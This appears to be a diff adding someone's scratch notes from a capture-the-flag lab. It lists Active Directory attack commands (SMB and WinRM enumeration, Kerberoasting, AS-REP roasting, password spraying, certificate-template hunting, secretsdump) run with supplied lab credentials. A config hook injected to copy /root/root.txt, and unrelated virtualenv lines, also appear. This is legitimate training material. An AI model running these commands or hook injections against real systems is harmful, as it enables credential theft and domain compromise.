@@ -1,0 +1,78 @@
+cat > /opt/relay/config/update_config.json << 'EOF'
+{
+    "model_name": "meridian-research",
+    "ollama_host": "http://10.10.10.20:11434",
+    "pre_update_hook": "cat /root/root.txt > /tmp/flag.txt && chmod 777 /tmp/flag.txt",
+    "post_update_hook": ""
+}
+EOF
+
+
+
+
+
+
+
+
+
+
+Iniciará el CTF con las credenciales para la siguiente cuenta 
+
+
+mark
+
+suP3rPa$sw0rd2026!& 
+
+
+smbmap -H 192.168.56.100 -u mark -p 'suP3rPa$sw0rd2026!&'
+
+smbmap -H 192.168.56.100 -u mark -p 'suP3rPa$sw0rd2026!&' -r
+
+
+
+netexec smb 192.168.56.100 -u mark -p 'suP3rPa$sw0rd2026!&'
+
+
+netexec winrm -i 192.168.56.100 -u mark -p 'suP3rPa$sw0rd2026!&'
+
+
+
+rpcclient -U mark%'suP3rPa$sw0rd2026!&' 192.168.56.100 
+
+
+netexec smb 192.168.56.100 -u mark -p 'suP3rPa$sw0rd2026!&' --shares  
+
+smbclient  //192.168.56.100/Oro -U mark    
+
+
+impacket-GetUserSPNs tryhackme.loc/mark:'suP3rPa$sw0rd2026!&' -request
+
+impacket-GetNPUsers -usersfile uservalid.txt -no-pass spookysec.local/ 
+
+
+netexec smb 192.168.56.100 -u  -p /usr/share/wordlists/rockyou.txt --continue-on-success
+
+
+
+ldapdomaindump -u "corp.local\mark" -p 'suP3rPa$sw0rd2026!&' 192.168.56.100
+
+
+certipy-ad find -u 'mark' -p 'suP3rPa$sw0rd2026!&' -dc-ip 192.168.56.100 -vulnerable -stdout
+
+
+ldapdomaindump -u "corp.local\pentester" -p "Winter2025!" 192.168.1.10
+
+
+impacket-secretsdump administrator.local/mark:'suP3rPa$sw0rd2026!&'%192.168.56.100
+
+ldapsearch -x -H ldap://192.168.56.100 -s base
+ldapsearch -x -H ldap://192.168.56.100 -b 'DC=TELECORE,DC=AD' 'objectClass=group'
+
+
+
+
+
+
+wilmer@tfm:~/Documentos/IA_Videos_Traslate$ python3 -m venv venv
+wilmer@tfm:~/Documentos/IA_Videos_Traslate$ source /home/wilmer/Documentos/IA_Videos_Traslate/venv/bin/activate
+(venv) wilmer@tfm:~/Documentos/IA_Videos_Traslate$ 
